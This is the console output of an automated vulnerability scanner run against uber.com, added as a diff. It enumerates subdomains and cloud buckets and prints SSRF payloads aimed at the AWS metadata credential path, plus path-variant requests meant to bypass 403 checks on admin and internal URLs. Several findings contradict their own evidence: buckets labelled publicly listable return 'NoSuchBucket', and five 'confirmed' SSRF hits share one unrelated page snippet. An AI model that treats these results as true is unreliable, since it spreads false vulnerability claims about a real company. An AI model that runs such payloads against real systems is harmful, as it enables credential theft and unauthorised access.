@@ -1,0 +1,1181 @@
+
+ ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
+ ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
+ ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
+ ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
+ ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
+ ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
+                                          ███████╗ ██████╗ █████╗ ███╗   ██╗
+                                          ██╔════╝██╔════╝██╔══██╗████╗  ██║
+                                          ███████╗██║     ███████║██╔██╗ ██║
+                                          ╚════██║██║     ██╔══██║██║╚██╗██║
+                                          ███████║╚██████╗██║  ██║██║ ╚████║
+                                          ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
+
+  Version 5.19.0  |  Target: https://uber.com
+  Started: 2026-05-10 19:58:34
+
+
+  ┌─ Fingerprinting ────────────────────────────────────────
+  │
+  │  WAF       Cloudflare
+  │  Server    cloudflare
+  │  Tech      Unknown
+  │  CMS       None
+  │  CDN       Cloudflare
+
+  ┌─ Baseline analysis ─────────────────────────────────────
+
+  ┌─ Passive crawl (endpoint discovery + per-endpoint baselines) 
+
+  ┌─ Per-endpoint baselines built (5 endpoints) ────────────
+
+  ┌─ Recon ─────────────────────────────────────────────────
+
+  ┌─ Vulnerability scanning ────────────────────────────────
+
+  ┌─ Offensive modules ─────────────────────────────────────
+
+  [i]     [INFO] Asset Links (Android) accessible
+       Module: recon/crawler
+       URL:    https://uber.com/.well-known/assetlinks.json
+       Desc:   `/.well-known/assetlinks.json` est accessible publiquement.
+       Evid:   [{"relation":["delegate_permission/common.handle_all_urls","delegate_permission/common.get_login_creds"],"target":{"namespace":"android_app","package_name":"com.ubercab","sha256_cert_fingerprints":["4
+
+  [i]     [INFO] Apple App Assoc. accessible
+       Module: recon/crawler
+       URL:    https://uber.com/.well-known/apple-app-site-association
+       Desc:   `/.well-known/apple-app-site-association` est accessible publiquement.
+       Evid:   
+{
+  "appclips": {
+    "apps": ["5F83KRY2FH.com.ubercab.UberClient.Clip"]
+  },
+  "applinks": {
+    "apps": [],
+    "details": [
+      {
+        "appID": "5F83KRY2FH.com.ubercab.UberClient.development"
+
+  [LOW]   [LOW] robots.txt — 37 paths disclosed
+       Module: recon/crawler
+       URL:    https://uber.com/robots.txt
+       Desc:   robots.txt expose des paths cachés (Disallow/Allow).
+       Evid:   *.js
+*.css
+/invite
+/report-issue
+*/?_ga
+*?gh_jid
+*/?client_id
+*/?realestate_id
+*/go/
+*/cmlntest-access
+*/api/
+*/custom-api/
+*/_uwa
+/app/
+/local/search
+/local/*?*sort
+/local/*/*/*/*/
+/in/hi/e/*
+/in/bn/
+
+  [i]     [INFO] sitemap.xml — 175 URLs
+       Module: recon/crawler
+       URL:    https://www.uber.com/sitemap.xml
+       Desc:   Sitemap expose 175 URL(s).
+       Evid:   https://www.uber.com/dynamic_cities_narrowgeo-sitemap.xml
+https://www.uber.com/dynamic_cities_narrowgeo2-sitemap.xml
+https://www.uber.com/dynamic_cities_narrowgeo3-sitemap.xml
+https://www.uber.com/dyn
+
+  [i]     [INFO] sitemap.xml — 18 URLs
+       Module: recon/crawler
+       URL:    https://uber.com/sitemap.xml
+       Desc:   Sitemap expose 18 URL(s).
+       Evid:   https://www.uber.com/dynamic_cities_narrowgeo-sitemap.xml
+https://www.uber.com/dynamic_cities_narrowgeo2-sitemap.xml
+https://www.uber.com/dynamic_cities_narrowgeo3-sitemap.xml
+https://www.uber.com/dyn
+
+  [i]     [INFO] WebSocket endpoint découvert
+       Module: recon/crawler
+       URL:    https://uber.com/ma/en/
+       Desc:   WebSocket détecté : wss://*.hotjar.com
+       Evid:   wss://*.hotjar.com
+
+  [i]     [INFO] Sitemap Discovery — 175 URLs found
+       Module: recon/sitemap_recon
+       URL:    https://uber.com/sitemap.xml
+       Desc:   Sitemap.xml/robots.txt ont révélé 175 URLs. 0 URLs sensibles, 0 URLs avec paramètres à fort potentiel.
+       Evid:   Total URLs: 175 | Sensitive: 0 | High-value params: 0 | Examples: []
+       CWE:    CWE-200
+       Fix:    Revoir le contenu du sitemap — ne pas exposer les URLs d'admin.
+
+  [CRIT]  [CRITICAL] SSRF — endpoint /proxy?url= → AWS IAM via IMDS
+       Module: vulns/ssrf
+       URL:    https://uber.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/
+       Desc:   Endpoint SSRF confirmé: /proxy?url= avec payload http://169.254.169.254/latest/meta-data/iam/
+       Evid:   Indicator: token_retry\u0022:{\u0022destinations\u0022:{\u0022heatpipe\u0022:[{\u0022method\u0022:\u0022track\u0022,\u0022schemes\u0022:[\u0022s-hp-botdefense\u0022]}],\u0022m3\u0022:[{\u0022method\u0
+       CWE:    CWE-918
+       Fix:    Supprimer ou sécuriser les endpoints qui fetch des URLs externes.
+
+  [CRIT]  [CRITICAL] SSRF — endpoint /image?url= → AWS IMDSv1
+       Module: vulns/ssrf
+       URL:    https://uber.com/image?url=http://169.254.169.254/latest/meta-data/
+       Desc:   Endpoint SSRF confirmé: /image?url= avec payload http://169.254.169.254/latest/meta-data/
+       Evid:   Indicator: token_retry\u0022:{\u0022destinations\u0022:{\u0022heatpipe\u0022:[{\u0022method\u0022:\u0022track\u0022,\u0022schemes\u0022:[\u0022s-hp-botdefense\u0022]}],\u0022m3\u0022:[{\u0022method\u0
+       CWE:    CWE-918
+       Fix:    Supprimer ou sécuriser les endpoints qui fetch des URLs externes.
+
+  [CRIT]  [CRITICAL] SSRF — endpoint /load?src= → AWS IAM via IMDS
+       Module: vulns/ssrf
+       URL:    https://uber.com/load?src=http://169.254.169.254/latest/meta-data/iam/
+       Desc:   Endpoint SSRF confirmé: /load?src= avec payload http://169.254.169.254/latest/meta-data/iam/
+       Evid:   Indicator: token_retry\u0022:{\u0022destinations\u0022:{\u0022heatpipe\u0022:[{\u0022method\u0022:\u0022track\u0022,\u0022schemes\u0022:[\u0022s-hp-botdefense\u0022]}],\u0022m3\u0022:[{\u0022method\u0
+       CWE:    CWE-918
+       Fix:    Supprimer ou sécuriser les endpoints qui fetch des URLs externes.
+
+  [CRIT]  [CRITICAL] SSRF — endpoint /webhook?target= → AWS IAM via IMDS
+       Module: vulns/ssrf
+       URL:    https://uber.com/webhook?target=http://169.254.169.254/latest/meta-data/iam/
+       Desc:   Endpoint SSRF confirmé: /webhook?target= avec payload http://169.254.169.254/latest/meta-data/iam/
+       Evid:   Indicator: token_retry\u0022:{\u0022destinations\u0022:{\u0022heatpipe\u0022:[{\u0022method\u0022:\u0022track\u0022,\u0022schemes\u0022:[\u0022s-hp-botdefense\u0022]}],\u0022m3\u0022:[{\u0022method\u0
+       CWE:    CWE-918
+       Fix:    Supprimer ou sécuriser les endpoints qui fetch des URLs externes.
+
+  [CRIT]  [CRITICAL] SSRF — endpoint /external?link= → AWS IAM via IMDS
+       Module: vulns/ssrf
+       URL:    https://uber.com/external?link=http://169.254.169.254/latest/meta-data/iam/
+       Desc:   Endpoint SSRF confirmé: /external?link= avec payload http://169.254.169.254/latest/meta-data/iam/
+       Evid:   Indicator: token_retry\u0022:{\u0022destinations\u0022:{\u0022heatpipe\u0022:[{\u0022method\u0022:\u0022track\u0022,\u0022schemes\u0022:[\u0022s-hp-botdefense\u0022]}],\u0022m3\u0022:[{\u0022method\u0
+       CWE:    CWE-918
+       Fix:    Supprimer ou sécuriser les endpoints qui fetch des URLs externes.
+
+  [i]     [INFO] AWS S3 Bucket Exists — uber
+       Module: recon/cloud_recon
+       URL:    https://uber.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber` existe mais son accès est refusé. Vérifier sa configuration de permissions et la politique bucket.
+       Evid:   HTTP 403 | AccessDenied or bucket exists
+       CWE:    CWE-200
+       Fix:    Vérifier que le bucket n'est pas accessible publiquement.
+
+  [i]     [INFO] GCP Bucket Exists — uber
+       Module: recon/cloud_recon
+       URL:    https://storage.googleapis.com/uber/
+       Desc:   Bucket GCP `uber` existe (accès refusé).
+       Evid:   HTTP 403
+       CWE:    CWE-200
+       Fix:    Vérifier les bindings IAM allUsers.
+
+  [i]     [INFO] AWS S3 Bucket Exists — uber-backup
+       Module: recon/cloud_recon
+       URL:    https://uber-backup.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber-backup` existe mais son accès est refusé. Vérifier sa configuration de permissions et la politique bucket.
+       Evid:   HTTP 403 | AccessDenied or bucket exists
+       CWE:    CWE-200
+       Fix:    Vérifier que le bucket n'est pas accessible publiquement.
+
+  [i]     [INFO] AWS S3 Bucket Exists — uber-backups
+       Module: recon/cloud_recon
+       URL:    https://uber-backups.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber-backups` existe mais son accès est refusé. Vérifier sa configuration de permissions et la politique bucket.
+       Evid:   HTTP 403 | AccessDenied or bucket exists
+       CWE:    CWE-200
+       Fix:    Vérifier que le bucket n'est pas accessible publiquement.
+
+  [i]     [INFO] AWS S3 Bucket Exists — uber-dev
+       Module: recon/cloud_recon
+       URL:    https://uber-dev.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber-dev` existe mais son accès est refusé. Vérifier sa configuration de permissions et la politique bucket.
+       Evid:   HTTP 403 | AccessDenied or bucket exists
+       CWE:    CWE-200
+       Fix:    Vérifier que le bucket n'est pas accessible publiquement.
+
+  [MED]   [MEDIUM] AWS S3 Bucket Publicly Accessible — uber-development
+       Module: recon/cloud_recon
+       URL:    https://uber-development.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber-development` est accessible publiquement. Listing activé.
+       Evid:   HTTP 404 | Files: [] | Body: <?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>NoSuchBucket</Code><Message>The specified bucket does not exist</Message><BucketName>uber-development</BucketName><Requ
+       CWE:    CWE-200
+       Fix:    Désactiver le Block Public Access. Supprimer les ACL 'public-read' et 'public-read-write'. Utiliser des policies bucket restrictives.
+
+  [i]     [INFO] AWS S3 Bucket Exists — uber-staging
+       Module: recon/cloud_recon
+       URL:    https://uber-staging.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber-staging` existe mais son accès est refusé. Vérifier sa configuration de permissions et la politique bucket.
+       Evid:   HTTP 403 | AccessDenied or bucket exists
+       CWE:    CWE-200
+       Fix:    Vérifier que le bucket n'est pas accessible publiquement.
+
+  [i]     [INFO] GCP Bucket Exists — uber-staging
+       Module: recon/cloud_recon
+       URL:    https://storage.googleapis.com/uber-staging/
+       Desc:   Bucket GCP `uber-staging` existe (accès refusé).
+       Evid:   HTTP 403
+       CWE:    CWE-200
+       Fix:    Vérifier les bindings IAM allUsers.
+
+  [MED]   [MEDIUM] AWS S3 Bucket Publicly Accessible — uber-stage
+       Module: recon/cloud_recon
+       URL:    https://uber-stage.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber-stage` est accessible publiquement. Listing activé.
+       Evid:   HTTP 404 | Files: [] | Body: <?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>NoSuchBucket</Code><Message>The specified bucket does not exist</Message><BucketName>uber-stage</BucketName><RequestId>
+       CWE:    CWE-200
+       Fix:    Désactiver le Block Public Access. Supprimer les ACL 'public-read' et 'public-read-write'. Utiliser des policies bucket restrictives.
+
+  [i]     [INFO] AWS S3 Bucket Exists — uber-prod
+       Module: recon/cloud_recon
+       URL:    https://uber-prod.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber-prod` existe mais son accès est refusé. Vérifier sa configuration de permissions et la politique bucket.
+       Evid:   HTTP 403 | AccessDenied or bucket exists
+       CWE:    CWE-200
+       Fix:    Vérifier que le bucket n'est pas accessible publiquement.
+
+  [MED]   [MEDIUM] AWS S3 Bucket Publicly Accessible — uber-production
+       Module: recon/cloud_recon
+       URL:    https://uber-production.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber-production` est accessible publiquement. Listing activé.
+       Evid:   HTTP 404 | Files: [] | Body: <?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>NoSuchBucket</Code><Message>The specified bucket does not exist</Message><BucketName>uber-production</BucketName><Reque
+       CWE:    CWE-200
+       Fix:    Désactiver le Block Public Access. Supprimer les ACL 'public-read' et 'public-read-write'. Utiliser des policies bucket restrictives.
+
+  [i]     [INFO] AWS S3 Bucket Exists — uber-assets
+       Module: recon/cloud_recon
+       URL:    https://uber-assets.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber-assets` existe mais son accès est refusé. Vérifier sa configuration de permissions et la politique bucket.
+       Evid:   HTTP 403 | AccessDenied or bucket exists
+       CWE:    CWE-200
+       Fix:    Vérifier que le bucket n'est pas accessible publiquement.
+
+  [i]     [INFO] AWS S3 Bucket Exists — uber-static
+       Module: recon/cloud_recon
+       URL:    https://uber-static.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber-static` existe mais son accès est refusé. Vérifier sa configuration de permissions et la politique bucket.
+       Evid:   HTTP 403 | AccessDenied or bucket exists
+       CWE:    CWE-200
+       Fix:    Vérifier que le bucket n'est pas accessible publiquement.
+
+  [MED]   [MEDIUM] AWS S3 Bucket Publicly Accessible — uber-media
+       Module: recon/cloud_recon
+       URL:    https://uber-media.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber-media` est accessible publiquement. Listing activé.
+       Evid:   HTTP 404 | Files: [] | Body: <?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>NoSuchBucket</Code><Message>The specified bucket does not exist</Message><BucketName>uber-media</BucketName><RequestId>
+       CWE:    CWE-200
+       Fix:    Désactiver le Block Public Access. Supprimer les ACL 'public-read' et 'public-read-write'. Utiliser des policies bucket restrictives.
+
+  [i]     [INFO] AWS S3 Bucket Exists — uber-images
+       Module: recon/cloud_recon
+       URL:    https://uber-images.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber-images` existe mais son accès est refusé. Vérifier sa configuration de permissions et la politique bucket.
+       Evid:   HTTP 403 | AccessDenied or bucket exists
+       CWE:    CWE-200
+       Fix:    Vérifier que le bucket n'est pas accessible publiquement.
+
+  [i]     [INFO] AWS S3 Bucket Exists — uber-img
+       Module: recon/cloud_recon
+       URL:    https://uber-img.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber-img` existe mais son accès est refusé. Vérifier sa configuration de permissions et la politique bucket.
+       Evid:   HTTP 403 | AccessDenied or bucket exists
+       CWE:    CWE-200
+       Fix:    Vérifier que le bucket n'est pas accessible publiquement.
+
+  [i]     [INFO] AWS S3 Bucket Exists — uber-files
+       Module: recon/cloud_recon
+       URL:    https://uber-files.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber-files` existe mais son accès est refusé. Vérifier sa configuration de permissions et la politique bucket.
+       Evid:   HTTP 403 | AccessDenied or bucket exists
+       CWE:    CWE-200
+       Fix:    Vérifier que le bucket n'est pas accessible publiquement.
+
+  [i]     [INFO] Subdomain discovered: a.uber.com
+       Module: recon/subdomain
+       URL:    https://a.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   a.uber.com
+
+  [i]     [INFO] Subdomain discovered: academy.uber.com
+       Module: recon/subdomain
+       URL:    https://academy.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   academy.uber.com
+
+  [i]     [INFO] Subdomain discovered: accessibility.uber.com
+       Module: recon/subdomain
+       URL:    https://accessibility.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   accessibility.uber.com
+
+  [i]     [INFO] Subdomain discovered: account.uber.com
+       Module: recon/subdomain
+       URL:    https://account.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   account.uber.com
+
+  [i]     [INFO] Subdomain discovered: accounts.uber.com
+       Module: recon/subdomain
+       URL:    https://accounts.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   accounts.uber.com
+
+  [i]     [INFO] Subdomain discovered: adsacademy.uber.com
+       Module: recon/subdomain
+       URL:    https://adsacademy.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   adsacademy.uber.com
+
+  [i]     [INFO] Subdomain discovered: advertiser.uber.com
+       Module: recon/subdomain
+       URL:    https://advertiser.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   advertiser.uber.com
+
+  [i]     [INFO] Subdomain discovered: ak04a6qc.uber.com
+       Module: recon/subdomain
+       URL:    https://ak04a6qc.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   ak04a6qc.uber.com
+
+  [i]     [INFO] Subdomain discovered: amp.uber.com
+       Module: recon/subdomain
+       URL:    https://amp.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   amp.uber.com
+
+  [i]     [INFO] Subdomain discovered: anz-seniors-card.uber.com
+       Module: recon/subdomain
+       URL:    https://anz-seniors-card.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   anz-seniors-card.uber.com
+
+  [i]     [INFO] Subdomain discovered: api-asterisk.uber.com
+       Module: recon/subdomain
+       URL:    https://api-asterisk.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   api-asterisk.uber.com
+
+  [i]     [INFO] Subdomain discovered: api.uber.com
+       Module: recon/subdomain
+       URL:    https://api.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   api.uber.com
+
+  [i]     [INFO] Subdomain discovered: ar.uber.com
+       Module: recon/subdomain
+       URL:    https://ar.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   ar.uber.com
+
+  [i]     [INFO] Subdomain discovered: assets.uber.com
+       Module: recon/subdomain
+       URL:    https://assets.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   assets.uber.com
+
+  [i]     [INFO] Subdomain discovered: auth.uber.com
+       Module: recon/subdomain
+       URL:    https://auth.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   auth.uber.com
+
+  [i]     [INFO] Subdomain discovered: backup.uber.com
+       Module: recon/subdomain
+       URL:    https://backup.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   backup.uber.com
+
+  [i]     [INFO] Subdomain discovered: base.uber.com
+       Module: recon/subdomain
+       URL:    https://base.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   base.uber.com
+
+  [i]     [INFO] Subdomain discovered: beacon.uber.com
+       Module: recon/subdomain
+       URL:    https://beacon.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   beacon.uber.com
+
+  [i]     [INFO] Subdomain discovered: biz-stage.uber.com
+       Module: recon/subdomain
+       URL:    https://biz-stage.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   biz-stage.uber.com
+
+  [i]     [INFO] Subdomain discovered: biz.uber.com
+       Module: recon/subdomain
+       URL:    https://biz.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   biz.uber.com
+
+  [i]     [INFO] Subdomain discovered: bizblog.uber.com
+       Module: recon/subdomain
+       URL:    https://bizblog.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   bizblog.uber.com
+
+  [i]     [INFO] Subdomain discovered: bizsys.uber.com
+       Module: recon/subdomain
+       URL:    https://bizsys.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   bizsys.uber.com
+
+  [i]     [INFO] Subdomain discovered: blog.uber.com
+       Module: recon/subdomain
+       URL:    https://blog.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   blog.uber.com
+
+  [i]     [INFO] Subdomain discovered: bonjour.uber.com
+       Module: recon/subdomain
+       URL:    https://bonjour.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   bonjour.uber.com
+
+  [i]     [INFO] Subdomain discovered: bounce.uber.com
+       Module: recon/subdomain
+       URL:    https://bounce.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   bounce.uber.com
+
+  [i]     [INFO] Subdomain discovered: brand.uber.com
+       Module: recon/subdomain
+       URL:    https://brand.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   brand.uber.com
+
+  [i]     [INFO] Subdomain discovered: business.uber.com
+       Module: recon/subdomain
+       URL:    https://business.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   business.uber.com
+
+  [i]     [INFO] Subdomain discovered: businesses.uber.com
+       Module: recon/subdomain
+       URL:    https://businesses.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   businesses.uber.com
+
+  [i]     [INFO] Subdomain discovered: central.uber.com
+       Module: recon/subdomain
+       URL:    https://central.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   central.uber.com
+
+  [i]     [INFO] Subdomain discovered: cisionone-email.uber.com
+       Module: recon/subdomain
+       URL:    https://cisionone-email.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   cisionone-email.uber.com
+
+  [i]     [INFO] Subdomain discovered: click.uber.com
+       Module: recon/subdomain
+       URL:    https://click.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   click.uber.com
+
+  [i]     [INFO] Subdomain discovered: client-scaledsolutions.uber.com
+       Module: recon/subdomain
+       URL:    https://client-scaledsolutions.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   client-scaledsolutions.uber.com
+
+  [i]     [INFO] Subdomain discovered: clients.uber.com
+       Module: recon/subdomain
+       URL:    https://clients.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   clients.uber.com
+
+  [i]     [INFO] Subdomain discovered: cloudflare-weighted.uber.com
+       Module: recon/subdomain
+       URL:    https://cloudflare-weighted.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   cloudflare-weighted.uber.com
+
+  [i]     [INFO] Subdomain discovered: cloudflare.uber.com
+       Module: recon/subdomain
+       URL:    https://cloudflare.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   cloudflare.uber.com
+
+  [i]     [INFO] Subdomain discovered: cn-dc1.uber.com
+       Module: recon/subdomain
+       URL:    https://cn-dc1.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   cn-dc1.uber.com
+
+  [i]     [INFO] Subdomain discovered: cn-dca1.uber.com
+       Module: recon/subdomain
+       URL:    https://cn-dca1.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   cn-dca1.uber.com
+
+  [i]     [INFO] Subdomain discovered: cn-ecg.cfe.uber.com
+       Module: recon/subdomain
+       URL:    https://cn-ecg.cfe.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   cn-ecg.cfe.uber.com
+
+  [i]     [INFO] Subdomain discovered: cn-gcp.cfe.uber.com
+       Module: recon/subdomain
+       URL:    https://cn-gcp.cfe.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   cn-gcp.cfe.uber.com
+
+  [i]     [INFO] Subdomain discovered: cn-geo1.uber.com
+       Module: recon/subdomain
+       URL:    https://cn-geo1.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   cn-geo1.uber.com
+
+  [i]     [INFO] Subdomain discovered: cn-neg-geo.cfe.uber.com
+       Module: recon/subdomain
+       URL:    https://cn-neg-geo.cfe.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   cn-neg-geo.cfe.uber.com
+
+  [i]     [INFO] Subdomain discovered: comarketing.uber.com
+       Module: recon/subdomain
+       URL:    https://comarketing.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   comarketing.uber.com
+
+  [i]     [INFO] Subdomain discovered: conecta.uber.com
+       Module: recon/subdomain
+       URL:    https://conecta.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   conecta.uber.com
+
+  [i]     [INFO] Subdomain discovered: contact.uber.com
+       Module: recon/subdomain
+       URL:    https://contact.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   contact.uber.com
+
+  [i]     [INFO] Subdomain discovered: csp.uber.com
+       Module: recon/subdomain
+       URL:    https://csp.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   csp.uber.com
+
+  [i]     [INFO] Subdomain discovered: data.uber.com
+       Module: recon/subdomain
+       URL:    https://data.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   data.uber.com
+
+  [i]     [INFO] Subdomain discovered: dc-dca.uber.com
+       Module: recon/subdomain
+       URL:    https://dc-dca.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   dc-dca.uber.com
+
+  [i]     [INFO] Subdomain discovered: dc-phx.uber.com
+       Module: recon/subdomain
+       URL:    https://dc-phx.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   dc-phx.uber.com
+
+  [i]     [INFO] Subdomain discovered: def.uber.com
+       Module: recon/subdomain
+       URL:    https://def.uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   def.uber.com
+
+  [i]     [INFO] Subdomain discovered: uber.com
+       Module: recon/subdomain
+       URL:    https://uber.com
+       Desc:   Sous-domaine actif découvert via: hackertarget
+       Evid:   uber.com
+
+  [HIGH]  [HIGH] Auth Bypass via path variant
+       Module: vulns/auth_bypass
+       URL:    https://www.uber.com/ａpi/ａdmin
+       Desc:   Contournement 403 → 200 via variante de chemin
+       Evid:   Original: https://www.uber.com/api/admin | Bypass: https://www.uber.com/ａpi/ａdmin
+       CWE:    CWE-284
+       Fix:    Normaliser les chemins avant validation des ACL. Appliquer la normalisation Unicode (NFC/NFKC) avant le contrôle d'accès.
+
+  [HIGH]  [HIGH] Auth Bypass via path variant
+       Module: vulns/auth_bypass
+       URL:    https://www.uber.com/%ef%bc%8fapi/admin
+       Desc:   Contournement 403 → 200 via variante de chemin
+       Evid:   Original: https://www.uber.com/api/admin | Bypass: https://www.uber.com/%ef%bc%8fapi/admin
+       CWE:    CWE-284
+       Fix:    Normaliser les chemins avant validation des ACL. Appliquer la normalisation Unicode (NFC/NFKC) avant le contrôle d'accès.
+
+  [HIGH]  [HIGH] Auth Bypass via path variant
+       Module: vulns/auth_bypass
+       URL:    https://www.uber.com/internal/
+       Desc:   Contournement 403 → 200 via variante de chemin
+       Evid:   Original: https://www.uber.com/internal | Bypass: https://www.uber.com/internal/
+       CWE:    CWE-284
+       Fix:    Normaliser les chemins avant validation des ACL. Appliquer la normalisation Unicode (NFC/NFKC) avant le contrôle d'accès.
+
+  [HIGH]  [HIGH] Auth Bypass via path variant
+       Module: vulns/auth_bypass
+       URL:    https://www.uber.com/internal//
+       Desc:   Contournement 403 → 200 via variante de chemin
+       Evid:   Original: https://www.uber.com/internal | Bypass: https://www.uber.com/internal//
+       CWE:    CWE-284
+       Fix:    Normaliser les chemins avant validation des ACL. Appliquer la normalisation Unicode (NFC/NFKC) avant le contrôle d'accès.
+
+  [HIGH]  [HIGH] Auth Bypass via path variant
+       Module: vulns/auth_bypass
+       URL:    https://www.uber.com/internal%20
+       Desc:   Contournement 403 → 200 via variante de chemin
+       Evid:   Original: https://www.uber.com/internal | Bypass: https://www.uber.com/internal%20
+       CWE:    CWE-284
+       Fix:    Normaliser les chemins avant validation des ACL. Appliquer la normalisation Unicode (NFC/NFKC) avant le contrôle d'accès.
+
+  [HIGH]  [HIGH] Auth Bypass via path variant
+       Module: vulns/auth_bypass
+       URL:    https://www.uber.com/internal%09
+       Desc:   Contournement 403 → 200 via variante de chemin
+       Evid:   Original: https://www.uber.com/internal | Bypass: https://www.uber.com/internal%09
+       CWE:    CWE-284
+       Fix:    Normaliser les chemins avant validation des ACL. Appliquer la normalisation Unicode (NFC/NFKC) avant le contrôle d'accès.
+
+  [HIGH]  [HIGH] Auth Bypass via path variant
+       Module: vulns/auth_bypass
+       URL:    https://www.uber.com/internal?
+       Desc:   Contournement 403 → 200 via variante de chemin
+       Evid:   Original: https://www.uber.com/internal | Bypass: https://www.uber.com/internal?
+       CWE:    CWE-284
+       Fix:    Normaliser les chemins avant validation des ACL. Appliquer la normalisation Unicode (NFC/NFKC) avant le contrôle d'accès.
+
+  [HIGH]  [HIGH] Auth Bypass via path variant
+       Module: vulns/auth_bypass
+       URL:    https://www.uber.com/internal?debug=true
+       Desc:   Contournement 403 → 200 via variante de chemin
+       Evid:   Original: https://www.uber.com/internal | Bypass: https://www.uber.com/internal?debug=true
+       CWE:    CWE-284
+       Fix:    Normaliser les chemins avant validation des ACL. Appliquer la normalisation Unicode (NFC/NFKC) avant le contrôle d'accès.
+
+  [HIGH]  [HIGH] Auth Bypass via path variant
+       Module: vulns/auth_bypass
+       URL:    https://www.uber.com/internal#
+       Desc:   Contournement 403 → 200 via variante de chemin
+       Evid:   Original: https://www.uber.com/internal | Bypass: https://www.uber.com/internal#
+       CWE:    CWE-284
+       Fix:    Normaliser les chemins avant validation des ACL. Appliquer la normalisation Unicode (NFC/NFKC) avant le contrôle d'accès.
+
+  [HIGH]  [HIGH] Auth Bypass via path variant
+       Module: vulns/auth_bypass
+       URL:    https://www.uber.com/internal.html
+       Desc:   Contournement 403 → 200 via variante de chemin
+       Evid:   Original: https://www.uber.com/internal | Bypass: https://www.uber.com/internal.html
+       CWE:    CWE-284
